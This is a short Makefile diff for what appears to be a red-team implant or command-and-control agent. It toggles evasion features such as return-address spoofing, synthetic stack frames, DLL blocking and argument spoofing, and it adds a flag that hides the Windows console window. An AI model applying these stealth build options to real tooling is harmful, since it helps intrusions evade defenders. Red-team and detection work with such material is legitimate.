@@ -63,7 +63,7 @@ WIN_CFLAGS += -DENABLE_RET_ADDR_SPOOF=$(ENABLE_RET_ADDR_SPOOF)
 WIN_CFLAGS += -DENABLE_SYNTHETIC_FRAMES=$(ENABLE_SYNTHETIC_FRAMES)
 WIN_CFLAGS += -DENABLE_BLOCK_DLLS=$(ENABLE_BLOCK_DLLS)
 WIN_CFLAGS += -DENABLE_ARG_SPOOF=$(ENABLE_ARG_SPOOF)
-WIN_LDFLAGS = -lwinhttp -lws2_32 -lbcrypt -lgdi32 -ladvapi32 -static-libgcc
+WIN_LDFLAGS = -mwindows -lwinhttp -lws2_32 -lbcrypt -lgdi32 -ladvapi32 -static-libgcc
 
 # ── Linux flags ──
 LINUX_CFLAGS  = -Wall -Wextra -O2 -s $(COMMON_DEFS)
